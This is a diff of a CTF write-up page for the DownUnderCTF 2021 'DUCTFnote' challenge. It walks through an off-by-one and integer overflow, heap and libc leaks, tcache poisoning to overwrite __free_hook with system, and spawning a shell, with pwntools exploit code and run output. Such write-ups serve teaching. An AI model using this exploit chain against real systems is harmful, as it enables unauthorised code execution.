@@ -3,23 +3,21 @@
   <head>
     <title>[DownUnderCTF 2021 - pwn] DUCTFnote // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
 
     
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-8K5XT0SJN8', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
 }
 </script>
 
@@ -36,9 +34,10 @@ The main difficulty was that we could only have one active note at a time, so if
 Source code analysis I spotted one bug in the source code which leads to another bug :
 135 void edit_note(datanote_t * note) { 136 if(!note) { 137 printf(&#34;No Note.\n&#34;); 138 return; 139 } 140 141 signed char idx = 0; 142 while(idx &lt;= note-&gt;size) { // note-&gt;size can takes values from 0 to 127 (0x7f) 143 *(&amp;(note-&gt;data)&#43;idx) = fgetc(stdin); 144 if (*(&amp;(note-&gt;data)&#43;idx) == &#39;\n&#39;) {*(&amp;(note-&gt;data)&#43;idx) = &#39;\0&#39;; break;} 145 idx&#43;&#43;; 146 } 147 } In the function edit_note the condition of the while is incorrect and the loop is executed once too often : while(idx &lt;= note-&gt;size) should have been while(idx &lt; note-&gt;size)." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/ductf_note/" />
+<meta property="og:url" content="https://ret2school.github.io/post/ductf_note/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-09-30T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-09-30T00:00:00+00:00" />
+
 
 
   </head>
@@ -108,7 +107,7 @@ Source code analysis I spotted one bug in the source code which leads to another
 The main difficulty was that we could only have one active note at a time, so if we create a new note, the old one is no longer accessible.</p>
 <h1 id="source-code-analysis">Source code analysis</h1>
 <p>I spotted one bug in the <a href="https://github.com/ret2school/ctf/blob/master/2021/down_under_ctf/pwn/ductf_note/ductfnote.c">source code</a> which leads to another bug :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#bd93f9">135</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">edit_note</span>(datanote_t <span style="color:#ff79c6">*</span> note) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#bd93f9">135</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">edit_note</span>(datanote_t <span style="color:#ff79c6">*</span> note) {
 <span style="color:#bd93f9">136</span>         <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>note) {
 <span style="color:#bd93f9">137</span>                 printf(<span style="color:#f1fa8c">&#34;No Note.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
 <span style="color:#bd93f9">138</span>                 <span style="color:#ff79c6">return</span>;
@@ -125,11 +124,11 @@ The main difficulty was that we could only have one active note at a time, so if
 Thanks to this bug, we can trigger an integer overflow : <code>idx</code> is a <code>signed char</code>, we know that a <code>char</code> takes 1 byte in memory, so a <code>signed char</code> can takes values from -128 to 127, if <code>note-&gt;size</code> equals 127, then <code>idx++</code> will trigger the integer overflow and <code>idx</code> will have the value -128, it allows us to write data from <code>&amp;note-&gt;data - 128</code> to <code>&amp;note-&gt;data + 127</code> (ie before <code>note-&gt;data</code>).</p>
 <h1 id="overwriting-param-maxsize">Overwriting <code>param-&gt;maxsize</code></h1>
 <p>Using these bugs, we can overwrite <code>param-&gt;maxsize</code> with <code>0xffffffff</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4"># set maxsize to 0xffffffff (max value on 4 bytes) -&gt; integer overflow in create_note allows us to     malloc small chunks</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4"># set maxsize to 0xffffffff (max value on 4 bytes) -&gt; integer overflow in create_note allows us to     malloc small chunks</span>
 create_note(<span style="color:#bd93f9">127</span>)
 edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">127</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">85</span> <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x21</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0xffffffff</span>))
 </code></pre></div><p>It allows us to malloc any size and even small size :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#bd93f9">109</span> datanote_t <span style="color:#ff79c6">*</span> <span style="color:#50fa7b">create_note</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> size, param_t <span style="color:#ff79c6">*</span>params) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#bd93f9">109</span> datanote_t <span style="color:#ff79c6">*</span> <span style="color:#50fa7b">create_note</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> size, param_t <span style="color:#ff79c6">*</span>params) {
 <span style="color:#bd93f9">110</span>         <span style="color:#ff79c6">if</span> (size <span style="color:#ff79c6">&gt;</span> params<span style="color:#ff79c6">-&gt;</span>maxsize) {
 <span style="color:#bd93f9">111</span>                 printf(<span style="color:#f1fa8c">&#34;Note too big.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
 <span style="color:#bd93f9">112</span>                 <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
@@ -150,7 +149,7 @@ edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A
 <p>This will be useful later.</p>
 <h1 id="leaking-heap-base-address">Leaking heap base address</h1>
 <p>Let&rsquo;s take a look at <code>show_note</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#bd93f9">121</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">show_note</span>(datanote_t <span style="color:#ff79c6">*</span> note) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#bd93f9">121</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">show_note</span>(datanote_t <span style="color:#ff79c6">*</span> note) {
 <span style="color:#bd93f9">122</span>         <span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>note) {
 <span style="color:#bd93f9">123</span>                 printf(<span style="color:#f1fa8c">&#34;No Note.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
 <span style="color:#bd93f9">124</span>                 <span style="color:#ff79c6">return</span>;
@@ -163,7 +162,7 @@ edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A
 <span style="color:#bd93f9">131</span>         printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
 <span style="color:#bd93f9">132</span> }
 </code></pre></div><p>With the out-of-bounds write, we can overwrite <code>note-&gt;size</code>, moreover <code>fwrite</code> doesn&rsquo;t care of null bytes so we can leak some data placed after <code>note-&gt;data</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">info(<span style="color:#f1fa8c">&#34;leaking heap address...&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">info(<span style="color:#f1fa8c">&#34;leaking heap address...&#34;</span>)
 create_note(<span style="color:#bd93f9">0</span>)
 
 create_note(<span style="color:#bd93f9">127</span>)
@@ -173,7 +172,7 @@ create_note(<span style="color:#bd93f9">0</span>)
 delete_note()
 <span style="color:#6272a4"># this free&#39;d chunk now contains a heap pointer</span>
 </code></pre></div><p>We are in this situation :</p>
-<pre><code>┌──────────────────────────────────────────────────┐
+<pre tabindex="0"><code>┌──────────────────────────────────────────────────┐
 │        note (size : 0)                           │
 ├──────────────────────────────────────────────────┤
 │ free'd note (size : 127)                         │
@@ -181,12 +180,12 @@ delete_note()
 │ free'd note (size : 0) (contains a heap pointer) │
 └──────────────────────────────────────────────────┘
 </code></pre><p>We now have to create a new note of size 127 and overwite its <code>note-&gt;size</code> with a higher value :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">create_note(<span style="color:#bd93f9">127</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">create_note(<span style="color:#bd93f9">127</span>)
 <span style="color:#6272a4"># 0x111 : chunk size</span>
 <span style="color:#6272a4"># 0x1000 : note-&gt;size</span>
 edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">127</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">117</span> <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x1000</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0xdead</span>))
 </code></pre></div><p>We now have this :</p>
-<pre><code>┌──────────────────────────────────────────────────┐
+<pre tabindex="0"><code>┌──────────────────────────────────────────────────┐
 │  BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  │
 ├──────────────────────────────────────────────────┤
 │ active note (size : 0x1000)                      │
@@ -194,12 +193,12 @@ edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A
 │ free'd note (size : 0) (contains a heap pointer) │
 └──────────────────────────────────────────────────┘
 </code></pre><p>We juste have have to call <code>show_note</code> to get our heap pointer :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">heap_base <span style="color:#ff79c6">=</span> u64(show_note()[<span style="color:#bd93f9">0x114</span>:<span style="color:#bd93f9">0x114</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>]) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>
-success(f<span style="color:#f1fa8c">&#34;heap base @ {hex(heap_base)}&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">heap_base <span style="color:#ff79c6">=</span> u64(show_note()[<span style="color:#bd93f9">0x114</span>:<span style="color:#bd93f9">0x114</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>]) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x10</span>
+success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap base @ </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap_base)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
 </code></pre></div><h1 id="leaking-libc-base-address">Leaking libc base address</h1>
 <p>To get a libc address, we have to free a chunk that will end up in unsorted bin.<br>
 So the idea is to create a large fake chunk of size 0x500 (large enough to not fit in a tcache bin), add padding to avoid <code>double free or corruption (!prev)</code> error caused by the lack of the <code>PREV_INUSE</code> bit in the next chunk, and then free this large chunk, malloc will let a libc pointer.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">info(<span style="color:#f1fa8c">&#34;leaking libc address...&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">info(<span style="color:#f1fa8c">&#34;leaking libc address...&#34;</span>)
 <span style="color:#6272a4"># will be used to leak data</span>
 create_note(<span style="color:#bd93f9">0x200</span>)
 delete_note()
@@ -229,13 +228,13 @@ delete_note()
 create_note(<span style="color:#bd93f9">0x200</span>)
 edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">127</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">117</span> <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0x291</span>) <span style="color:#ff79c6">+</span> p32(<span style="color:#bd93f9">0x1000</span>))
 libc_base <span style="color:#ff79c6">=</span> u64(show_note()[<span style="color:#bd93f9">0x28c</span>:<span style="color:#bd93f9">0x28c</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">8</span>]) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1ebbe0</span>
-success(f<span style="color:#f1fa8c">&#34;libc base @ {hex(libc_base)}&#34;</span>)
+success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc base @ </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_base)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
 
 <span style="color:#6272a4"># malloc will use in priority unsorted bin instead of creating new chunks from top chunk</span>
 </code></pre></div><p>The chunk in unsorted bin will be used to create other smaller chunks that will overlap already existing chunks, that&rsquo;s why we placed two chunks in tcache bin. It will allows us to overwrite pointers from a free&rsquo;d chunk and make malloc returns us an arbitrary pointer.</p>
 <h1 id="overwriting-__free_hook-with-system">Overwriting <code>__free_hook</code> with <code>system</code></h1>
 <p>Now that we have overlapping chunks, it remains for us to allocate the right amount of data and overwrite the pointers of the free&rsquo;d chunks placed in tcache bin in order to make malloc returns us an arbitrary pointer and get a write-what-where primitive.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">info(<span style="color:#f1fa8c">&#34;overwriting __free_hook with system...&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">info(<span style="color:#f1fa8c">&#34;overwriting __free_hook with system...&#34;</span>)
 target <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;__free_hook&#34;</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>
 
 attach_gdb()
@@ -249,11 +248,11 @@ edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;J
 </code></pre></div><p>With the write-what-where primitive, we overwrote <code>__free_hook</code> with <code>system</code>.</p>
 <h1 id="getting-a-shell">Getting a shell</h1>
 <p>We now have to free a chunk which contains <code>/bin/sh</code> at the beginning (I used the out-of-bounds write for that).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">create_note(<span style="color:#bd93f9">127</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">create_note(<span style="color:#bd93f9">127</span>)
 edit_note(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">127</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">117</span> <span style="color:#ff79c6">+</span> p64(<span style="color:#bd93f9">0xdead</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>)
 delete_note()
 </code></pre></div><p>The complete exploit is available here : <a href="https://github.com/ret2school/ctf/blob/master/2021/down_under_ctf/pwn/ductf_note/exploit.py">https://github.com/ret2school/ctf/blob/master/2021/down_under_ctf/pwn/ductf_note/exploit.py</a></p>
-<pre><code>[+] Opening connection to pwn-2021.duc.tf on port 31917: Done
+<pre tabindex="0"><code>[+] Opening connection to pwn-2021.duc.tf on port 31917: Done
 [*] leaking libc address...
 [+] libc base @ 0x7f201d1c4000
 [*] leaking heap address...
